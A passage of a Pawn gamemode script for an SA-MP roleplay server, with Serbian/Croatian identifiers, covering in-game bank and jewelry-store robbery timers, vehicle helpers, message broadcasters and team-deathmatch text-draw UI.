	    TogHud[ playerid ] = false;
	}
	else if( !TogHud[ playerid ] )
	{
	    BuildIngameTextDraws(playerid, false);

		PlayerTextDrawHide( playerid, WantedLevel_pTD[ playerid ][ 0 ] ), PlayerTextDrawHide( playerid, WantedLevel_pTD[ playerid ][ 1 ] );

        SMG_SetHealthBarVisible( playerid, false );

	    TogHud[ playerid ] = true;
	}
}

//------------------------------------------------------------------------------

stock IsCordsInOtherGZone( Float:x, Float:y ) {
    for( new id = 0; id < MAX_GZONE; id++) {
		if( x <= gZoneInfo[ id ][ gZoneMaxX ] && x >= gZoneInfo[ id ][ gZoneMinX ] && y <= gZoneInfo[ id ][ gZoneMaxY ] && y >= gZoneInfo[ id ][ gZoneMinY ] ) {
			return id;
		}
	}
	return -1;
}

stock IsCordsInGZone( id, Float:x, Float:y ) 
{
	if( x <= gZoneInfo[ id ][ gZoneMaxX ] && x >= gZoneInfo[ id ][ gZoneMinX ] && y <= gZoneInfo[ id ][ gZoneMaxY ] && y >= gZoneInfo[ id ][ gZoneMinY ] ) 
	{
		return id;
	}
	return -1;
}

//------------------------------------------------------------------------------

_:public DestroyPaket()
{
    if( IsValidDynamicObject( ServerInfo[ PaketObject ] ) ) DestroyDynamicObject( ServerInfo[ PaketObject ] );

	foreach( new i : Player)
	{
    	if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 )
		{
			SendClientMessage( i, 0x5CE8EDFF, "(PAKET - END): Niko nije pokupio paket 10 minuta nakon sto je ispao, paket je nestao." );
		}
	}

	ServerInfo[ PaketPoceo ] = false;
	ServerInfo[ PaketID ] = -1;
	ServerInfo[ PaketNijeNaSvomMestu ] = false;
	ServerInfo[ PaketVreme ] = 0;
    ServerInfo[ PaketStvari ][ 0 ] = 0;
	ServerInfo[ PaketStvari ][ 1 ] = 0;
	PaketNewPos[0] = 0.0;
	PaketNewPos[1] = 0.0;
	PaketNewPos[2] = -10000.0;

    KillTimer(ServerInfo[ PaketTimer ]);
    return 1;
}

_:public PljackanjeZlatarice( playerid )
{
	new string[ 128 ];
	if( IsPlayerInDynamicArea( playerid, ZlataraSef ) )
	{
		if( ZlatoVreme[ playerid ] > 0 )
		{
	        new zlato = 1;

	    	PljackaZlato[ playerid ] += zlato;
	        format( string, sizeof( string ), "~w~Ostanite u sefu jos~n~~r~%d ~w~sekundi", ZlatoVreme[ playerid ] );
		    GameTextForPlayer( playerid, string, 1500, 4 ) ;
	    	ZlatoVreme[ playerid ]--;

	    }
	    else if( ZlatoVreme[ playerid ] == 0 )
		{
			format(string, sizeof( string ), "~w~Opljackali ste zlataru i uzeli~n~~g~%dg zlata !", PljackaZlato[ playerid ] );
			GameTextForPlayer( playerid, string, 3000, 3 );
			SCMF( playerid, 0xA00606FF, "(PLJACKA): Opljackali ste zlataru i uzeli {FFFFFF}(%dg) {A00606}zlata.", PljackaZlato[ playerid ] );
			KillTimer(PljackanjeZlatareTimer[ playerid ]);
            ZlatoVreme[ playerid ] = 0;
            PlayerInfo[ playerid ][ xZlato ] += PljackaZlato[ playerid ];
			sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );

            OOCNews( 0xFFA500AA, "[LS] Vesti: Zlatara je nazalost opljackana i opljackano je {FFFFFF}(%dg) {FFA500}zlata.", PljackaZlato[ playerid ] );

			PljackaZlato[ playerid ] = 0;

            PostaviWanted( playerid, "Pljacka Zlatare", "Nepoznati", 10 );
            ZlataraUToku = false;
		}
	}
	else
	{
        GameTextForPlayer( playerid, "~w~Otisli ste iz sefa!", 3000, 3) ;
        ZlatoVreme[ playerid ] = 0;
        SCMF( playerid, 0xA00606FF, "(PLJACKA): Opljackao si zlataru i uzeo {FFFFFF}(%dg) {A00606}zlata.", PljackaZlato[ playerid ] );
 		KillTimer(PljackanjeZlatareTimer[ playerid ]);
 		PlayerInfo[ playerid ][ xZlato ] += PljackaZlato[ playerid ];
		sql_user_update_integer( playerid, "xZlato", PlayerInfo[ playerid ][ xZlato ] );
		PljackaZlato[ playerid ] = 0;

 		PostaviWanted( playerid, "Pljacka Zlatare", "Nepoznati", 10 );
 		ZlataraUToku = false;

 		if( PljackaNovac[ playerid ] > 0 ) OOCNews( 0xFFA500AA, "[LS] Vesti: Zlatara je nazalost opljackana i opljackano je {FFFFFF}(%dg) {FFA500}zlata.", PljackaZlato[ playerid ] );
		else OOCNews( 0xFFA500AA, "[LS] Vesti: Zlatara na svu srecu nije opljackana." );
	}
	return 1;
}

_:public PljackanjeBankice( playerid )
{
	new string[ 128 ];
	if( IsPlayerInDynamicArea( playerid, bankSafe ) )
	{
	    if( PljackaVreme[ playerid ] > 0 )
		{
     		new novac = random(31)+220;

	     	PljackaNovac[ playerid ] += novac;
		    format( string, sizeof( string ), "~w~Ostanite u sefu jos~n~~r~%d ~w~sekundi", PljackaVreme[ playerid ] );
		    GameTextForPlayer( playerid, string, 1500, 4 ) ;
		    PljackaVreme[ playerid ]--;
	    }
	    else if( PljackaVreme[ playerid ] == 0 )
		{
			if(ServerInfo[BankaNovac] > 0)
			{
			    PljackaNovac[playerid] += ServerInfo[BankaNovac];
			    SCMF( playerid, 0xA00606FF, "(PLJACKA): U zadnjem trenutnu ste pronasli torbu u tajnom sefu u kojoj ima dodatnih {FFFFFF}($%d).", ServerInfo[BankaNovac] );

			    ServerInfo[BankaNovac] = 0;

				if(IsValidDynamic3DTextLabel(ServerInfo[ BankaNovacLabel ])) DestroyDynamic3DTextLabel(ServerInfo[ BankaNovacLabel ]);

			    new str[ 128 ];
				format( str, sizeof( str ), "(SEF)\nTrenutno u sefu ima {FFFFFF}(%d/300.000$)", ServerInfo[ BankaNovac ] );
				CreateDynamic3DTextLabel(str, 0x4282C0FF, 1607.1238,-1019.2515,-28.6981, 10.0);
			}
			else SendClientMessage( playerid, 0xA00606FF, "(PLJACKA): U zadnjem trenutnu ste pronasli torbu u tajnom sefu, ali torba je nazalost prazna.");

			format(string, sizeof( string ), "~w~Opljackali ste banku i uzeli~n~~g~$%d", PljackaNovac[ playerid ] );
			GameTextForPlayer( playerid, string, 3000, 3 );
			SCMF( playerid, 0xA00606FF, "(PLJACKA): Opljackali ste banku i uzeli {FFFFFF}($%d).", PljackaNovac[ playerid ] );
			KillTimer(PljackanjeBankeTimer[ playerid ]);
            PljackaVreme[ playerid ] = 0;
            DajIgracuNovac( playerid, PljackaNovac[ playerid ] );
			OOCNews( 0xFFA500AA, "[LS] Vesti: Banka je nazalost opljackana i opljackano je {FFFFFF}($%d).", PljackaNovac[ playerid ] );
			PljackaNovac[ playerid ] = 0;
            PostaviWanted( playerid, "Pljacka Banke", "Nepoznati", 10 );
            PljackaUToku = false;
		}
	}
	else
	{
        GameTextForPlayer( playerid, "~w~Otisli ste iz sefa!", 3000, 3) ;
        PljackaVreme[ playerid ] = 0;
        SCMF( playerid, 0xA00606FF, "(PLJACKA): Opljackao si banku i uzeo {FFFFFF}($%d).", PljackaNovac[ playerid ] );
 		KillTimer(PljackanjeBankeTimer[ playerid ]);
 		DajIgracuNovac( playerid, PljackaNovac[ playerid ] );
		PljackaNovac[ playerid ] = 0;
 		PostaviWanted( playerid, "Pljacka Banke", "Nepoznati", 10 );
 		PljackaUToku = false;

		if( PljackaNovac[ playerid ] > 0 ) OOCNews( 0xFFA500AA, "[LS] Vesti: Banka je nazalost djelimicno opljackana i opljackano je {FFFFFF}($%d).", PljackaNovac[ playerid ] );
		else OOCNews( 0xFFA500AA, "[LS] Vesti: Banka na svu srecu nije opljackana." );
	}
	return 1;
}


//------------------------------------------------------------------------------

_:public SMG_ChangeVehicleColor(vehicleID, color1, color2)
{
	/*new colorStr[24];
 	format(colorStr, sizeof(colorStr), "%d-%d", color1, color2);
	setproperty(_, "", PROPERTY_OFFSET(vehicleID), colorStr);*/

	return ChangeVehicleColor(vehicleID, color1, color2);
}

_:public GetVehicleColor(vehicleID, &color1, &color2)
{
	vehicleID = PROPERTY_OFFSET(vehicleID);

	if(existproperty(_, "", vehicleID))
 	{
  		new colorStr[24], strPos;
    	getproperty(_, "", vehicleID, colorStr);
     	strunpack(colorStr, colorStr);

		if((strPos = strfind(colorStr, "-")) != -1)
  		{
    		color1 = strval(colorStr);
      		color2 = strval(colorStr[strPos + 1]);
        	return 1;
		}
  	}
	return 0;
}

//------------------------------------------------------------------------------

_:public SMG_CreateVehicle( modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay )
{
	if( ServerInfo[ BrojKreiranihVozila ] <= MaxBrojKreiranih )
	{
		ServerInfo[ BrojKreiranihVozila ]++;
		new idKreiranog;

		if( color1 < 0 || color2 < 0 ) color1 = random(127), color2 = random(127);

		if( modelid == 538 ) idKreiranog = AddStaticVehicleEx( modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay );
		else idKreiranog = CreateVehicle( modelid, Float:x, Float:y, Float:z, Float:angle, color1, color2, respawn_delay );

        new colorStr[24];
        format(colorStr, sizeof(colorStr), "%d-%d", color1, color2);
        setproperty(_, "", PROPERTY_OFFSET(idKreiranog), colorStr);

        occupied[ idKreiranog ] = false;

		RealVehiclePositions[ idKreiranog ][ 0 ] = x;
		RealVehiclePositions[ idKreiranog ][ 1 ] = y;
		RealVehiclePositions[ idKreiranog ][ 2 ] = z;
		return idKreiranog;
	}
	else return -1;
}

_:public SMG_DestroyVehicle( vehicleid )
{
	if( DestroyVehicle( vehicleid ) )
	{
	    if( vehicleid != -1 )
		{
			if( VehicleInfo[ vehicleid ][ vSqlID ] != 0 )
			{
			    if( VehicleInfo[ vehicleid ][ Validv3DText ] )
				{
			        VehicleInfo[ vehicleid ][ Validv3DText ] = false;
    				DestroyDynamic3DTextLabel(VehicleInfo[ vehicleid ][ v3DText ]);
				}
			}

		    deleteproperty(_, "", PROPERTY_OFFSET(vehicleid));

		    if( Neon[ vehicleid ] == 1 )
			{
				Neon[ vehicleid ] = 0;
		  		DestroyDynamicObject( NeonObject1[ vehicleid ] );
			   	DestroyDynamicObject( NeonObject2[ vehicleid ] );
			}
			RealVehiclePositions[ vehicleid ][ 0 ] = 0.0;
			RealVehiclePositions[ vehicleid ][ 1 ] = 0.0;
			RealVehiclePositions[ vehicleid ][ 2 ] = 0.0;
		}

		VehicleObjectCheck( vehicleid );

	    ServerInfo[ BrojKreiranihVozila ]--;
		return 1;
	}
	else return -1;
}
//------------------------------------------------------------------------------
static stock IsSpecialUser(playerid)
{
    for(new i = 0; i < sizeof(Special_Users); i++) 
    {
        if(!strcmp(ImeIgraca(playerid), Special_Users[i])) 
        {
            return 1;
        }
    }
    return 0;
}
//------------------------------------------------------------------------------
_:public SMG_RepairVehicle( playerid, vehicleid )
{
	RepairVehicle( vehicleid );
	SetVehicleHealth( vehicleid, 1000 );
	return 1;
}
//------------------------------------------------------------------------------
#define GetVehicleNameEx(%0)      						   ImeVozila[(%0) - 400]
getVehicleName( vehicle )
{
	new vehName[ 20 ] = "A Hotring Racer";

    if( vehicle == -1 )
	{
		format( vehName, sizeof( vehName ), "%s", "Nema Vozila" );
	}
	else if( vehicle != -1 )
	{
        if( VehicleInfo[ vehicle ][ vSqlID ] != 0 )
		{
            if( VehicleInfo[ vehicle ][ vModel ] >= 400 && VehicleInfo[ vehicle ][ vModel ] <= 611 )
			{
				format( vehName, sizeof( vehName ), "%s", GetVehicleNameEx( VehicleInfo[ vehicle ][ vModel ] ) );
			}
			else format( vehName, sizeof( vehName ), "%s", "Nema Vozila" );
		}
		else
		{
		    format( vehName, sizeof( vehName ), "%s", "Nema Vozila" );
		}
	}

	return vehName;
}
//------------------------------------------------------------------------------
_:public PilotUtovar( playerid )
{
	KillTimer(PilotTimer[ playerid ]);
    SMG_TogglePlayerControllable( playerid, true );
    GameTextForPlayer( playerid, "~w~Nova lokacija postavljena", 3000, 5 );
    return 1;
}
//------------------------------------------------------------------------------
PreloadAnimations(playerid)
{
	for(new i = 0; i < sizeof(anim_libs); i ++)
	{
	    ApplyAnimation(playerid, anim_libs[ i ], "null", 4.0, 0, 0, 0, 0, 0, 1);
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public SMG_SetPlayerCheckpoint( playerid, Float:x, Float:y, Float:z, Float:size )
{
    if( PlayerCPShow[ playerid ] == true )
	{
        DisablePlayerCheckpoint( playerid );
        PlayerCPShow[ playerid ] = false;
	}
	PlayerCPShow[ playerid ] = true;
	return SetPlayerCheckpoint( playerid, Float:x, Float:y, Float:z, Float:size );
}

_:public SMG_DisablePlayerCheckpoint( playerid )
{
	if( PlayerCPShow[ playerid ] == true )
	{
		DisablePlayerCheckpoint( playerid );
		PlayerCPShow[ playerid ] = false;
    }
}
//------------------------------------------------------------------------------
SetSexSkin( playerid )
{
    new sexskin;

	if( PlayerInfo[ playerid ][ xPol ] == 1 ) sexskin = MALE_SKIN;
	else if( PlayerInfo[ playerid ][ xPol ] == 2 ) sexskin = FEMALE_SKIN;
	else sexskin = MALE_SKIN;

	return sexskin;
}
//------------------------------------------------------------------------------
SetRandomSpawn( playerid )
{
    new randomspawn;

	if( playerid % 2 == 0 ) randomspawn = SPAWN_OBICAN_LS_1;
	else randomspawn = SPAWN_OBICAN_LS_2;

	return randomspawn;
}
//------------------------------------------------------------------------------
WARPoruka(w, color, const text[], {Float,_}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 3)
	{
	    foreach( new i : Player)
		{
			if( WARPInfo[ i ][ WARIgrac ] == w )
			{
				SendClientMessage( i, color, text );
			}
		}
	}
	else
	{
		while(--args >= 3)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 	text
		#emit PUSH.C 	192
		#emit PUSH.C 	str
		#emit PUSH.S	8
		#emit SYSREQ.C 	format
		#emit LCTRL 	5
		#emit SCTRL 	4

		foreach( new i : Player)
		{
			if( WARPInfo[ i ][ WARIgrac ] == w )
			{
				SendClientMessage( i, color, str );
			}
		}

		#emit RETN
	}
	return 1;
}
//------------------------------------------------------------------------------
send_tdm_message(color, const text[], {Float,_}:...)
{
	static
  	    args,
	    str[192];

	if((args = numargs()) <= 2)
	{
	    foreach( new i : Player)
		{
			if( tdm_player_info[ i ][ tdm_Team ] != 0 )
			{
				SendClientMessage( i, color, text );
			}
		}
	}
	else
	{
		while(--args >= 2)
		{
			#emit LCTRL 	5
			#emit LOAD.alt 	args
			#emit SHL.C.alt 2
			#emit ADD.C 	12
			#emit ADD
			#emit LOAD.I
			#emit PUSH.pri
		}
		#emit PUSH.S 		text
		#emit PUSH.C 		192
		#emit PUSH.C 		str
		#emit LOAD.S.pri 	8
		#emit ADD.C 		4
		#emit PUSH.pri
		#emit SYSREQ.C 		format
		#emit LCTRL 		5
		#emit SCTRL 		4

		foreach( new i : Player)
		{
			if( tdm_player_info[ i ][ tdm_Team ] != 0 )
			{
				SendClientMessage( i, color, str );
			}
		}

		#emit RETN
	}
	return 1;
}
//==============================================================================
_:public ResetTuningInfo( playerid )
{
	TPInfo[ playerid ][ tID ] = -1;
	TPInfo[ playerid ][ tType ] = -1;
	TPInfo[ playerid ][ tPaintjob ] = false;
	TPInfo[ playerid ][ PJColor ] = -1;
	TPInfo[ playerid ][ PJColor ] = -1;
	return 1;
}
//==============================================================================
_:public tdmTDControl( playerid, bool:show )
{
	if( show == true )
	{
		tdm_player_tds[playerid][0] = CreatePlayerTextDraw(playerid, 189.736419, 180.666702, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][0], 0.000000, 16.137626);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][0], 462.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][0], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][0], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][0], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][0], 1046028031);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][0], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][0], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][0], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][0], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][0], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][0], 0);

		tdm_player_tds[playerid][1] = CreatePlayerTextDraw(playerid, 190.336456, 181.466751, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][1], 0.000000, 15.876688);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][1], 461.080078, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][1], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][1], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][1], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][1], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][1], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][1], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][1], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][1], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][1], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][1], 0);

		tdm_player_tds[playerid][2] = CreatePlayerTextDraw(playerid, 191.036499, 182.366806, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][2], 0.000000, 15.712121);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][2], 461.000000, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][2], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][2], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][2], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][2], 1046028031);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][2], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][2], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][2], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][2], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][2], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][2], 0);

		tdm_player_tds[playerid][3] = CreatePlayerTextDraw(playerid, 191.273590, 196.150329, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][3], 0.000000, -0.285143);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][3], 460.120117, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][3], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][3], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][3], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][3], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][3], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][3], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][3], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][3], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][3], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][3], 0);

		tdm_player_tds[playerid][4] = CreatePlayerTextDraw(playerid, 190.832382, 184.600112, "Counter_Strike:_Online_servers");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][4], 0.158243, 0.818333);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][4], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][4], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][4], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][4], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][4], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][4], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][4], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][4], 0);

		tdm_player_tds[playerid][5] = CreatePlayerTextDraw(playerid, 451.977172, 183.116973, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][5], 0.000000, 0.972010);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][5], 460.179290, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][5], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][5], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][5], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][5], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][5], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][5], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][5], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][5], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][5], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][5], 0);

		tdm_player_tds[playerid][6] = CreatePlayerTextDraw(playerid, 456.388122, 180.133178, "X");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][6], 0.383132, 1.518332);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][6], 10.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][6], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][6], 1046028031);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][6], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][6], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][6], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][6], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][6], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][6], 0);
		PlayerTextDrawSetSelectable(playerid, tdm_player_tds[playerid][6], true);

		tdm_player_tds[playerid][7] = CreatePlayerTextDraw(playerid, 319.111511, 189.816696, "ld_beat:chit");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][7], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][7], 8.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][7], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][7], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][7], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][7], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][7], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][7], 4);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][7], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][7], 0);

		tdm_player_tds[playerid][8] = CreatePlayerTextDraw(playerid, 324.133789, 198.083358, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][8], 0.000000, 13.935577);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][8], 322.260620, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][8], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][8], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][8], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][8], 1619146495);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][8], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][8], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][8], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][8], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][8], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][8], 0);

		format( globalstring, sizeof( globalstring ), "team_deathmatch(%d/40)", ( tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ] + tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ] ) );
		tdm_player_tds[playerid][9] = CreatePlayerTextDraw(playerid, 257.745849, 198.400100, globalstring);
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][9], 0.179793, 0.894164);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][9], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][9], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][9], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][9], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][9], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][9], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][9], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][9], 0);

		tdm_player_tds[playerid][10] = CreatePlayerTextDraw(playerid, 197.484985, 215.666625, "");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][10], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][10], 56.000000, 58.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][10], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][10], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][10], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][10], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][10], 0);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][10], 5);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][10], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][10], 0);
		PlayerTextDrawSetPreviewModel(playerid, tdm_player_tds[playerid][10], 285);
		PlayerTextDrawSetPreviewRot(playerid, tdm_player_tds[playerid][10], 0.000000, 0.000000, 0.000000, 1.000000);

		tdm_player_tds[playerid][11] = CreatePlayerTextDraw(playerid, 193.016082, 275.749969, "box");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][11], 0.000000, 1.004394);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][11], 260.110107, 0.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][11], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][11], -1);
		PlayerTextDrawUseBox(playerid, tdm_player_tds[playerid][11], 1);
		PlayerTextDrawBoxColor(playerid, tdm_player_tds[playerid][11], 100);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][11], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][11], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][11], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][11], 1);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][11], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][11], 0);

		tdm_player_tds[playerid][12] = CreatePlayerTextDraw(playerid, 226.812637, 276.333282, "~b~CT");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][12], 0.148872, 0.765833);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][12], 2);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][12], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][12], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][12], 1);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][12], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][12], 2);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][12], 1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][12], 0);

		tdm_player_tds[playerid][13] = CreatePlayerTextDraw(playerid, 192.921707, 275.266754, "ld_beat:left");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][13], 0.000000, 0.000000);
		PlayerTextDrawTextSize(playerid, tdm_player_tds[playerid][13], 7.000000, 10.000000);
		PlayerTextDrawAlignment(playerid, tdm_player_tds[playerid][13], 1);
		PlayerTextDrawColor(playerid, tdm_player_tds[playerid][13], -1);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][13], 0);
		PlayerTextDrawSetOutline(playerid, tdm_player_tds[playerid][13], 0);
		PlayerTextDrawBackgroundColor(playerid, tdm_player_tds[playerid][13], 255);
		PlayerTextDrawFont(playerid, tdm_player_tds[playerid][13], 4);
		PlayerTextDrawSetProportional(playerid, tdm_player_tds[playerid][13], 0);
		PlayerTextDrawSetShadow(playerid, tdm_player_tds[playerid][13], 0);
		PlayerTextDrawSetSelectable(playerid, tdm_player_tds[playerid][13], true);

		tdm_player_tds[playerid][14] = CreatePlayerTextDraw(playerid, 253.355453, 275.266754, "ld_beat:right");
		PlayerTextDrawLetterSize(playerid, tdm_player_tds[playerid][14], 0.000000, 0.000000);
